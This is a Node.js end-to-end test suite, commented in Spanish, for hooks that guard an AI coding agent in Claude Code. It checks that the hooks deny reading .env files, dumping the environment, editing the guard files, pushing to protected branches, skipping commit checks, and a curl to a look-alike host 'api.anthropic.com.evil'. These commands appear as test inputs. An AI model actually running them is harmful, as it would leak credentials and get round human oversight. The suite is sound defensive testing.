// E2E de las guardas: workspace real (policy + lock + 2 repos git) y el JSON de Claude Code por stdin
// atravesando el lanzador POSIX `.claude/hooks/run`, igual que en una sesión real.
// La evidencia real de la corrida se guarda en test/e2e/evidence/guard-hooks.txt.
import test, { after, before } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync, appendFileSync, unlinkSync } from 'node:fs';
import { homedir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import policyCmd from '../../src/cli/policy.mjs';
import { defaultPolicy } from '../../src/policy/index.mjs';
import { makeT } from '../../src/lib/i18n.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, '..', '..');
const TMP = join(HERE, 'tmp');
/** Ruta absoluta de sh: los casos con PATH vacío no pueden depender del PATH ni para el propio shell. */
const SH = process.platform === 'win32' ? 'sh' : '/bin/sh';
const EVIDENCE = join(HERE, 'evidence', 'guard-hooks.txt');
/** Valores FALSOS reconocibles: nunca secretos reales en fixtures. */
const FAKE_AWS = 'AKIA' + 'IOSFODNN7EXAMPLE';
const FAKE_STRIPE = 'sk_test_' + 'AIPLACEHOLDER0000';

let WS = '';
const log = [];
const rec = (title, body) => log.push(`\n### ${title}\n${body}`);

// ---------------------------------------------------------------------------
// Utilidades del workspace de prueba
// ---------------------------------------------------------------------------

const git = (args, cwd) => spawnSync('git', args, { cwd, encoding: 'utf8' });

function initRepo(dir, branches) {
  mkdirSync(dir, { recursive: true });
  git(['init', '-q', '-b', 'dev'], dir);
  git(['config', 'user.email', 'bot@example.test'], dir);
  git(['config', 'user.name', 'bot-secure test'], dir);
  git(['config', 'commit.gpgsign', 'false'], dir);
  writeFileSync(join(dir, 'README.md'), '# app de prueba\n');
  git(['add', '-A'], dir);
  git(['commit', '-qm', 'inicial'], dir);
  for (const b of branches) if (b !== 'dev') git(['branch', b], dir);
  git(['remote', 'add', 'origin', 'https://example.test/repo.git'], dir);
}

function silentCtx(cwd, args, flags = {}) {
  const t = makeT('es');
  const noop = () => {};
  return {
    args, flags, cwd, lang: 'es', t,
    log: { json: false, info: noop, ok: noop, warn: noop, error: noop, step: noop, dim: noop, table: noop, data: noop },
    pkg: { version: '0.1.0' }, version: '0.1.0', dryRun: !!flags['dry-run'], yes: true,
  };
}

/** Invoca un hook igual que Claude Code: `sh ./.claude/hooks/run <evento>` con JSON por stdin. */
function hook(event, input = {}, opts = {}) {
  const r = spawnSync(SH, ['./.claude/hooks/run', event], {
    cwd: opts.cwd ?? WS,
    input: JSON.stringify({ cwd: WS, session_id: 's-test', ...input }),
    encoding: 'utf8',
    env: { ...process.env, ...(opts.env ?? {}) },
  });
  return { status: r.status, stdout: r.stdout ?? '', stderr: r.stderr ?? '' };
}

const preTool = (tool_name, tool_input, extra = {}) => hook('pre-tool', { tool_name, tool_input, ...extra });
function decision(res) {
  try { return JSON.parse(res.stdout).hookSpecificOutput; } catch { return null; }
}
function assertDeny(res, label) {
  const d = decision(res);
  assert.ok(d && d.permissionDecision === 'deny', `${label}: se esperaba deny, hubo ${res.stdout || res.stderr || '(sin salida)'}`);
  rec(label, `exit=${res.status}  deny: ${d.permissionDecisionReason}`);
  return d;
}
function assertAllow(res, label) {
  assert.equal(res.status, 0, `${label}: exit ${res.status}`);
  assert.equal(decision(res), null, `${label}: se esperaba permitir, hubo ${res.stdout}`);
  rec(label, `exit=0  permitido (sin decisión de deny)`);
}

const compileWorkspace = (flags = {}) => policyCmd.run(silentCtx(WS, ['compile'], flags));

// ---------------------------------------------------------------------------

before(async () => {
  mkdirSync(TMP, { recursive: true });
  WS = realpathSync(mkdtempSync(join(TMP, 'guard-hooks-')));
  const policy = defaultPolicy({
    project: 'tienda',
    apps: [
      { name: 'backend', path: 'backend', kind: 'backend', stack: 'spring', remote: 'https://example.test/api.git' },
      { name: 'frontend', path: 'frontend', kind: 'frontend', stack: 'next' },
    ],
  });
  policy.guard.docsReminder = true;
  mkdirSync(join(WS, '.bot-secure'), { recursive: true });
  writeFileSync(join(WS, '.bot-secure', 'policy.json'), JSON.stringify(policy, null, 2) + '\n');
  writeFileSync(join(WS, '.bot-secure', 'local.json'), JSON.stringify({ node: process.execPath, os: process.platform, sandboxProbe: true }, null, 2) + '\n');

  initRepo(join(WS, 'backend'), ['dev', 'ai-dev']);       // se queda en la rama protegida `dev`
  initRepo(join(WS, 'frontend'), ['dev', 'ai-dev']);
  git(['switch', '-q', 'ai-dev'], join(WS, 'frontend'));  // esta sí está en `ai-dev`

  // Fixture sensible con valores FALSOS reconocibles.
  writeFileSync(join(WS, 'backend', '.env'), `AWS_ACCESS_KEY_ID=${FAKE_AWS}\nSTRIPE=${FAKE_STRIPE}\n`);
  writeFileSync(join(WS, 'README.md'), '# workspace de prueba\n');

  await compileWorkspace();
  rec('Preparación', `workspace: <tmp>/guard-hooks-XXXX\nbackend: ${git(['rev-parse', '--abbrev-ref', 'HEAD'], join(WS, 'backend')).stdout.trim()}\nfrontend: ${git(['rev-parse', '--abbrev-ref', 'HEAD'], join(WS, 'frontend')).stdout.trim()}\nartefactos: ${JSON.parse(readFileSync(join(WS, '.bot-secure', 'lock.json'), 'utf8')).generated.length}`);
});

after(() => {
  mkdirSync(dirname(EVIDENCE), { recursive: true });
  // Se sustituyen las rutas de la máquina para que la evidencia versionada sea portable.
  const texto = log.join('\n').split(WS).join('<ws>').split(REPO).join('<repo>').split(homedir()).join('~');
  writeFileSync(EVIDENCE, `# Evidencia real: test/e2e/guard-hooks.test.mjs\n# Generado: ${new Date().toISOString()}\n# node ${process.version} · ${process.platform}\n${texto}\n`);
  try { rmSync(WS, { recursive: true, force: true }); } catch { /* Windows puede retener handles */ }
});

// ---------------------------------------------------------------------------
// Fase A: backend en rama protegida → la sesión queda bloqueada
// ---------------------------------------------------------------------------

test('session-start no bloquea (exit 0) pero marca la rama protegida con el comando exacto', () => {
  const res = hook('session-start', { source: 'startup', hook_event_name: 'SessionStart' });
  assert.equal(res.status, 0, 'SessionStart NUNCA bloquea');
  const out = decision(res);
  assert.equal(out.hookEventName, 'SessionStart');
  assert.match(out.additionalContext, /backend/);
  assert.match(out.additionalContext, /git -C backend switch ai-dev/);
  assert.match(out.additionalContext, /BLOQUEOS ACTIVOS/);
  const flags = JSON.parse(readFileSync(join(WS, '.claude', 'state', 'flags.json'), 'utf8'));
  assert.ok(flags.flags.some((f) => f.code === 'branch' && f.app === 'backend'));
  rec('session-start con backend en dev', `exit=${res.status}\nadditionalContext:\n${out.additionalContext}`);
});

test('statusline muestra ⛔ para la app en rama protegida y ✅ para la de ai-dev', () => {
  const res = hook('statusline', { hook_event_name: 'Status' });
  assert.equal(res.status, 0);
  assert.match(res.stdout, /⛔ backend:dev/);
  assert.match(res.stdout, /✅ frontend:ai-dev/);
  assert.match(res.stdout, /nivel 1/);
  rec('statusline', `exit=0\n${res.stdout.trim()}`);
});

test('prompt con la sesión bloqueada sale con exit 2', () => {
  const res = hook('prompt', { prompt: 'hola, arregla el login', hook_event_name: 'UserPromptSubmit' });
  assert.equal(res.status, 2, 'UserPromptSubmit debe bloquear con exit 2');
  assert.match(res.stderr, /rama protegida/);
  rec('prompt con bloqueo de rama', `exit=${res.status}\n${res.stderr.trim()}`);
});

test('con la sesión bloqueada solo pasan los comandos de recuperación', () => {
  assertDeny(preTool('Bash', { command: 'ls -la' }), 'pre-tool `ls -la` con la sesión bloqueada');
  assertAllow(preTool('Bash', { command: 'git -C backend switch ai-dev' }), 'pre-tool `git -C backend switch ai-dev` (recuperación)');
});

// ---------------------------------------------------------------------------
// Fase B: sesión sana → se prueban las guardas de herramienta
// ---------------------------------------------------------------------------

test('tras mover backend a ai-dev, session-start deja de marcar bloqueos', () => {
  git(['switch', '-q', 'ai-dev'], join(WS, 'backend'));
  const res = hook('session-start', { source: 'resume' });
  const out = decision(res);
  assert.equal(res.status, 0);
  assert.match(out.additionalContext, /Sin bloqueos/);
  const flags = JSON.parse(readFileSync(join(WS, '.claude', 'state', 'flags.json'), 'utf8'));
  assert.equal(flags.flags.length, 0);
  rec('session-start con todo en ai-dev', `exit=0\n${out.additionalContext}`);
});

test('prompt con un secreto (valor FALSO) sale con exit 2', () => {
  const res = hook('prompt', { prompt: `usa esta llave ${FAKE_AWS} para la demo` });
  assert.equal(res.status, 2);
  assert.match(res.stderr, /secreto|secret/i);
  assert.ok(!res.stderr.includes(FAKE_AWS), 'el mensaje NUNCA debe repetir el valor');
  rec('prompt con secreto falso', `exit=${res.status}\n${res.stderr.trim()}`);
});

test('prompt normal pasa', () => {
  const res = hook('prompt', { prompt: 'refactoriza el servicio de pedidos' });
  assert.equal(res.status, 0);
  rec('prompt normal', 'exit=0');
});

test('Bash `cat backend/.env` se deniega (los deny de Read no cubren Bash)', () => {
  const d = assertDeny(preTool('Bash', { command: 'cat backend/.env' }), 'pre-tool Bash `cat backend/.env`');
  assert.match(d.permissionDecisionReason, /env-file/);
  assert.ok(!d.permissionDecisionReason.includes(FAKE_AWS));
  assert.ok(existsSync(join(WS, '.claude', 'state', 'contaminated')), 'debe marcar la sesión como contaminada');
});

test('Bash con variable indirecta (f=.env; cat "$f") también se deniega', () => {
  assertDeny(preTool('Bash', { command: 'f=backend/.env; cat "$f"' }), 'pre-tool Bash con expansión de variable');
});

test('Read fuera del workspace se deniega (ruta absoluta)', () => {
  const res = preTool('Read', { file_path: join(REPO, 'package.json') });
  const d = assertDeny(res, 'pre-tool Read fuera del workspace');
  assert.match(d.permissionDecisionReason, /fuera del workspace|outside/i);
});

test('Read de ~/.claude.json se deniega (transcripts de otros proyectos)', () => {
  assertDeny(preTool('Read', { file_path: '~/.claude.json' }), 'pre-tool Read `~/.claude.json`');
});

test('Write con un token se deniega y no repite el valor', () => {
  const res = preTool('Write', { file_path: join(WS, 'backend', 'src', 'config.js'), content: `export const key = "${FAKE_AWS}";\n` });
  const d = assertDeny(res, 'pre-tool Write con secreto');
  assert.match(d.permissionDecisionReason, /__AI_PLACEHOLDER__/);
  assert.ok(!d.permissionDecisionReason.includes(FAKE_AWS));
});

test('Write de una supresión (gitleaks:allow) se deniega', () => {
  const res = preTool('Write', { file_path: join(WS, 'backend', 'src', 'ok.js'), content: '// gitleaks:allow\nconst a = 1;\n' });
  const d = assertDeny(res, 'pre-tool Write con `gitleaks:allow`');
  assert.match(d.permissionDecisionReason, /baseline add/);
});

test('Write sobre las guardas (.claude/) se deniega', () => {
  assertDeny(preTool('Write', { file_path: join(WS, '.claude', 'settings.json'), content: '{}' }), 'pre-tool Write sobre .claude/settings.json');
  assertDeny(preTool('Bash', { command: 'printf x > .claude/hooks/guard.mjs' }), 'pre-tool Bash redirigiendo a .claude/hooks/guard.mjs');
});

test('`git switch dev` se deniega y `git push origin ai/x` se permite', () => {
  assertDeny(preTool('Bash', { command: 'git -C backend switch dev' }), 'pre-tool `git -C backend switch dev`');
  assertAllow(preTool('Bash', { command: 'git push origin ai/mi-tarea' }), 'pre-tool `git push origin ai/mi-tarea`');
  assertDeny(preTool('Bash', { command: 'git push origin ai-dev' }), 'pre-tool `git push origin ai-dev` (solo CI)');
  assertDeny(preTool('Bash', { command: 'git commit -m x --no-verify' }), 'pre-tool `git commit --no-verify`');
});

test('curl a un host no permitido se deniega (FQDN exacto, no substring)', () => {
  const d = assertDeny(preTool('Bash', { command: 'curl http://api.anthropic.com.evil/?d=1' }), 'pre-tool `curl api.anthropic.com.evil`');
  assert.match(d.permissionDecisionReason, /api\.anthropic\.com\.evil/);
  assertDeny(preTool('Bash', { command: 'curl --resolve api.anthropic.com:443:9.9.9.9 https://api.anthropic.com/' }), 'pre-tool `curl --resolve`');
  assertAllow(preTool('Bash', { command: 'curl https://registry.npmjs.org/express' }), 'pre-tool `curl registry.npmjs.org` (registro permitido)');
});

test('volcado de entorno denegado; `env VAR=1 npm test` permitido', () => {
  assertDeny(preTool('Bash', { command: 'printenv' }), 'pre-tool `printenv`');
  assertDeny(preTool('Bash', { command: 'node -e "console.log(process.env)"' }), 'pre-tool `node -e process.env`');
  assertAllow(preTool('Bash', { command: 'env AI_ENV=1 npm test' }), 'pre-tool `env AI_ENV=1 npm test`');
});

test('los subagentes (agent_id en el JSON) reciben exactamente la misma decisión', () => {
  const res = preTool('Bash', { command: 'cat backend/.env' }, { agent_id: 'sub-1', agent_type: 'general-purpose' });
  const d = assertDeny(res, 'pre-tool desde subagente (agent_id=sub-1)');
  assert.match(d.permissionDecisionReason, /env-file/);
  const audit = readFileSync(join(WS, '.bot-secure', 'audit.log'), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
  assert.ok(audit.some((a) => a.agent === 'sub-1' && a.decision === 'deny'));
  assert.ok(!readFileSync(join(WS, '.bot-secure', 'audit.log'), 'utf8').includes(FAKE_AWS), 'el audit NUNCA guarda valores');
});

test('mcp__* se deniega si el servidor no está en policy.mcp.allowed', () => {
  assertDeny(preTool('mcp__zapier__send_email', { to: 'x@y.z' }), 'pre-tool `mcp__zapier__send_email`');
});

test('config-change bloquea con exit 2', () => {
  const res = hook('config-change', { hook_event_name: 'ConfigChange' });
  assert.equal(res.status, 2);
  assert.match(res.stderr, /policy compile/);
  rec('config-change', `exit=${res.status}\n${res.stderr.trim()}`);
});

// ---------------------------------------------------------------------------
// Fase C: integridad
// ---------------------------------------------------------------------------

test('alterar .claude/settings.json hace que el siguiente pre-tool deniegue por drift', async () => {
  appendFileSync(join(WS, '.claude', 'settings.json'), '\n');
  const d = assertDeny(preTool('Bash', { command: 'ls' }), 'pre-tool tras alterar .claude/settings.json');
  assert.match(d.permissionDecisionReason, /INTEGRIDAD ROTA|INTEGRITY BROKEN/);
  assert.match(d.permissionDecisionReason, /settings\.json/);
  await compileWorkspace({ force: true });
  assertAllow(preTool('Bash', { command: 'ls' }), 'pre-tool tras recompilar (integridad restaurada)');
});

// ---------------------------------------------------------------------------
// Fase D: fail-closed del lanzador
// ---------------------------------------------------------------------------

test('el lanzador es fail-closed: sin node utilizable, exit 2', () => {
  const res = hook('pre-tool', { tool_name: 'Bash', tool_input: { command: 'ls' } }, { env: { PATH: '', BOT_SECURE_NODE: join(WS, 'no-existe-node') } });
  assert.equal(res.status, 2, 'sin node el hook debe bloquear, nunca permitir en silencio');
  assert.match(res.stderr, /bot-secure/);
  rec('lanzador con PATH vacío y BOT_SECURE_NODE inválido', `exit=${res.status}\n${res.stderr.trim()}`);
});

test('el lanzador es fail-closed: sin guard.mjs, exit 2 (PATH vacío)', () => {
  const guard = join(WS, '.claude', 'hooks', 'guard.mjs');
  const backup = readFileSync(guard, 'utf8');
  unlinkSync(guard);
  try {
    const res = hook('pre-tool', { tool_name: 'Bash', tool_input: { command: 'ls' } }, { env: { PATH: '' } });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /bot-secure/);
    rec('lanzador con PATH vacío y sin guard.mjs', `exit=${res.status}\n${res.stderr.trim()}`);
  } finally { writeFileSync(guard, backup); }
});

test('fuera de un workspace el lanzador bloquea con instrucciones', () => {
  const outside = mkdtempSync(join(TMP, 'sin-workspace-'));
  mkdirSync(join(outside, '.claude', 'hooks'), { recursive: true });
  writeFileSync(join(outside, '.claude', 'hooks', 'run'), readFileSync(join(REPO, 'templates', 'hooks', 'run'), 'utf8'));
  const res = spawnSync(SH, ['./.claude/hooks/run', 'pre-tool'], { cwd: outside, input: '{}', encoding: 'utf8' });
  assert.equal(res.status, 2);
  assert.match(res.stderr, /no encuentro el workspace/);
  rec('lanzador fuera de un workspace', `exit=${res.status}\n${res.stderr.trim()}`);
  rmSync(outside, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Fase E: cierre de sesión
// ---------------------------------------------------------------------------

test('session-end abre un parte de incidente si hubo intentos contra recursos sensibles', () => {
  const transcript = join(WS, 'transcript.jsonl');
  writeFileSync(transcript, JSON.stringify({ role: 'assistant', text: 'todo bien' }) + '\n');
  const res = hook('session-end', { transcript_path: transcript, reason: 'clear' });
  assert.equal(res.status, 0);
  const incidents = readdirSync(join(WS, '.bot-secure')).filter((f) => f.startsWith('INCIDENT-')).join('\n');
  assert.match(incidents, /^INCIDENT-/m);
  const parte = readFileSync(join(WS, '.bot-secure', incidents.split('\n')[0]), 'utf8');
  assert.ok(!parte.includes(FAKE_AWS), 'el parte NUNCA contiene el valor de un secreto');
  assert.match(parte, /Rota las credenciales/);
  rec('session-end con sesión contaminada', `exit=${res.status}\narchivo: ${incidents.split('\n')[0]}\n${parte.split('\n').slice(0, 10).join('\n')}`);
});

test('hooks git: pre-push rechaza empujar a una rama protegida desde el entorno de IA', () => {
  const repo = join(WS, 'backend');
  const r = spawnSync(process.execPath, [join(WS, '.githooks', 'run.mjs'), 'pre-push'], {
    cwd: repo, encoding: 'utf8',
    input: 'refs/heads/ai-dev 1111111111111111111111111111111111111111 refs/heads/dev 0000000000000000000000000000000000000000\n',
  });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /pre-push/);
  rec('git pre-push hacia refs/heads/dev', `exit=${r.status}\n${r.stderr.trim()}`);
});

test('hooks git: pre-commit rechaza un commit con un secreto staged (valor FALSO)', () => {
  const repo = join(WS, 'frontend');
  writeFileSync(join(repo, 'config.js'), `export const k = "${FAKE_AWS}";\n`);
  git(['add', 'config.js'], repo);
  const r = spawnSync(process.execPath, [join(WS, '.githooks', 'run.mjs'), 'pre-commit'], { cwd: repo, encoding: 'utf8' });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /pre-commit/);
  assert.ok(!r.stderr.includes(FAKE_AWS), 'el mensaje NUNCA repite el valor');
  git(['reset', '-q'], repo);
  rec('git pre-commit con secreto staged', `exit=${r.status}\n${r.stderr.trim()}`);
});

test('hooks git: pre-commit rechaza supresiones inline (gitleaks:allow)', () => {
  const repo = join(WS, 'frontend');
  writeFileSync(join(repo, 'config.js'), '// gitleaks:allow\nexport const k = 1;\n');
  git(['add', 'config.js'], repo);
  const r = spawnSync(process.execPath, [join(WS, '.githooks', 'run.mjs'), 'pre-commit'], { cwd: repo, encoding: 'utf8' });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /baseline add/);
  git(['reset', '-q'], repo);
  rec('git pre-commit con gitleaks:allow', `exit=${r.status}\n${r.stderr.trim()}`);
});

test('el recordatorio de documentación bloquea el Stop una sola vez', () => {
  hook('post-tool', { tool_name: 'Write', tool_input: { file_path: join(WS, 'frontend', 'src', 'app.js') } });
  const first = hook('stop', { hook_event_name: 'Stop' });
  assert.equal(first.status, 2);
  assert.match(first.stderr, /docs/);
  const second = hook('stop', { hook_event_name: 'Stop' });
  assert.equal(second.status, 0, 'el recordatorio solo se pide una vez');
  rec('stop con recordatorio de docs', `1ª vez exit=${first.status}: ${first.stderr.trim()}\n2ª vez exit=${second.status}`);
});
